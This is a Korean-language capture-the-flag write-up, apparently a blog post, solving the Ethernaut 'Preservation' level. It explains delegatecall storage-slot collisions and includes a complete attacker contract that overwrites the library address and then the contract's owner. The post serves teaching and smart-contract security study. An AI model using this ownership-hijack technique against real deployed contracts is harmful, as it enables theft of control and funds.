https://teberr.notion.site/Ethernaut-Preservation-b51a0c48643342bca433297dddb86c6d

![Preservation.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1b01b156-6310-494d-86f6-7831acf14813/Preservation.png)

> 이 컨트랙트는 라이브러리를 사용해서 서로 다른 두개의 타임존(표준시)를 저장합니다. 생성자는 각 시간이 저장될 때 두 라이브러리 인스턴스를 만듭니다.

이 문제에서는 주어진 인스턴스의 ownership을 얻어내는 것이 목표입니다

힌트:
- delegatecall low level 함수가 어떻게 작동하는지, 온체인에서는 어떻게 사용되는지, 라이브러리 및 실행 범위에 미치는 영향을 알아보세요
- delegatecall이 어떻게 context-preserving이 일어나는지 알아보세요
- 상태 변수가 어떻게 저장되고 접근되는지 알아보세요.
- 서로다른 데이터 타입간에 캐스팅이 어떻게 일어나는지 알아보세요.
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

- 라이브러리의 목적은 블록체인에 배포된 코드를 재사용하기 위함. 암묵적인 베이스 라인 코드로 보면 됨. (단 위 문제에서 LibraryContract는 컨트랙트로 배포되어 있음)
- 라이브러리를 호출할 때는 EVM의 delegatecall을 사용하여 코드를 재사용하는데 이 때 실행 context( ex) msg.sender, msg.value 등)이 바뀌지 않고 함수가 실행 됨.
    - context는 실행 지점에서의 state(상태) 및 변수를 의미함.
- contract A에서 contract B를 delegate call하여 상태 변수가 변경될 경우 contract A의 상태변수가 변경됨.

# 코드 분석 및 공격 설계

## 상태 변수

```solidity
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

```

세 개의 주소 변수, uint(256), bytes4 상태 변수가 존재한다. 이 상태 변수들은 EVM에서 슬롯의 형태로 저장되는데 EVM에서는 하나의 슬롯당 32바이트 의 공간이 부여된다. address의 경우 20바이트이므로 위 상태 변수들은 각 슬롯당 하나 씩 차지하고 있다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/28752fc7-e7a5-4a8b-a0d1-eb1a2d015c3f/Untitled.png)

위와 같은 형태로 저장이 되어 있다. 물론 최적화를 위해 인접한 변수들의 크기가 합쳐서 32바이트 이내인 경우 하나의 슬롯에 같이 저장할 수 있지만 위 문제에서는 인접한 변수들을 합치면 32바이트가 넘어가므로 각 변수당 하나의 슬롯을 차지한다.

## 생성자

```solidity
  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
```

deploy 시에 timeZoneLibrary의 주소를 받아 각 변수에 저장하고 owner를 msg.sender로 설정한다.

### 함수

```solidity
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
```

setFirstTime과 setSecondeTime은 각 timeStamp 매개변수를 받아 Library의 setTime(uint256)함수의 인자로 넘겨주어 delegatecall을 실행시킨다. 그러면 Library 컨트랙트를 살펴보자.

### contract LibraryContract

```solidity
// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
```

인자로 받은 _time을 상태 변수인 storedTime에 저장하는 컨트랙트이다.

여기서 문제가 생긴다. 

delegatecall을 하여서 LibraryContract의 setTime을 수행하면 LibraryContract의 상태 변수가 존재하므로 EVM 내부적으로는 변수 이름 기준인 storedTime에 저장하는 것이 아닌 슬롯 순서인 0번 슬롯에 저장하는 방식으로 수행된다. 그런데 이 0번 슬롯은 호출한 컨트랙트의 0번 슬롯이 되므로 0번 슬롯에 존재하는 timeZone1Library를 덮어씌우게 된다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4118f706-0afa-4654-86ad-831e611a8a6f/Untitled.png)

이를 테스트하기 위해서 실제로 timeZone1Library를 덮어씌우는지 직접 문제 코드를 복사하여 VM에서 deploy하여 테스트해봤다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/48ba26dc-f278-435f-b284-b7307cab6bb7/Untitled.png)

timeZone1과 timeZone2에 LibraryContract 주소가 잘 들어가 있는 것을 확인할 수 있다. 하지만 setFirstTime을 실행시켜 0번 슬롯을 덮어씌우게 되면

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0e6e0174-dd7d-480e-8a02-ed9c672381c5/Untitled.png)

0번슬롯인 timeZone1Library 상태 변수가 덮어씌워진 것을 확인할 수 있다. 이를 이용하여 다음과 같이 공격을 진행할 것이다.

1. Preservation Contract의 owner를 나의 메타마스크 주소로 덮어씌워야 하므로 상태 변수 슬롯이 세개이며 setTime(uint256)함수가 존재하는 악의적인 Library Contract를 만든다.
2. 문제 인스턴스의 setFirstTime 함수를 실행시킬 때 인자를 내 악의적인 컨트랙트의 주소로 넣어준다.
3. 그러면 timeZone1Library함수가 내 악의적인 컨트랙트이므로 내 악의적인 컨트랙트 내의 setTime 함수코드는 세번째 상태변수 슬롯인 owner를 내 메타마스크 주소로 설정하도록 하면된다.   

# 공격

먼저 공격 컨트랙트를 작성하자.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IPreservation{
     function setFirstTime(uint _timeStamp) external;
}
contract PreservationAttack {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function attack(address _target) public {
      IPreservation(_target).setFirstTime(uint256(uint160(address(this))));
  }
  function setTime(uint _time) public {
    owner=0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a;
  }
}
```

상태 변수 슬롯을 세개를 만들어 주어서 owner를 변조할 것이다. 

attack은 문제 인스턴스의 setFirstTime을 공격 컨트랙트의 주소를 uint256으로 캐스팅한 값을 넘겨주어 timeZone1Library의 주소를 변조하는 함수이다.

setTime은 세번째 슬롯인 owner를 player의 메타마스크 주소로 변조하는 함수로 작성하였다.

attack 함수를 통해서 문제 인스턴스의 timeZone1Library를 변조하자.

![timeZone1Library 변조.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/75007218-8c5f-405a-956d-279a22610c6c/timeZone1Library_%EB%B3%80%EC%A1%B0.png)

attack 함수의 인자로 문제 인스턴스의 주소를 넘겨주어서 공격을 진행한다.

![timeZone1Library 변조1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e617766c-96ad-4548-aaee-035fffb0071e/timeZone1Library_%EB%B3%80%EC%A1%B01.png)

그러면 문제 인스턴스의 timeZoneLibrary 값이 내 공격 컨트랙트의 주소로 변경되었음을 알 수 있으므로 이제 문제의 setFirstTime 함수를 실행해주면 owner 값이 변조될 것이다. (인자로는 아무 값이나 주어도 상관없다. 어차피 delegatecall이 실행 될 공격 컨트랙트에서 전달 받은 인자를 사용하지 않기 때문)

![owner 변조.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c835508a-6304-4ca4-abdc-90ebf82fb038/owner_%EB%B3%80%EC%A1%B0.png)

owner를 성공적으로 변조하였다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/adba5d0e-4898-4837-a25d-fface0637c42/Untitled.png)

인스턴스를 제출하면 성공했음을 콘솔에서 확인할 수 있다.

# 문제 후기

이전 단계에서 본것 처럼 delegatecall을 사용해서 라이브러리를 호출하는 것은 상당히 위험합니다. 특히 컨트랙트 라이브러리에 상태 변수가 존재한다면 특히 변조의 위험이 더 커집니다. 라이브러리를 만들 때 library 키워드로 만들어주어야 상태변수를 저장하고 접근하는 것을 방지해주기 때문에 이 예제는 왜 library 키워드를 이용해서 라이브러리를 만드는 것이 좋은지를 알려주고 있습니다.

# 참고

[https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c) 

[https://steemit.com/kr/@etainclub/4-delegatecall](https://steemit.com/kr/@etainclub/4-delegatecall)
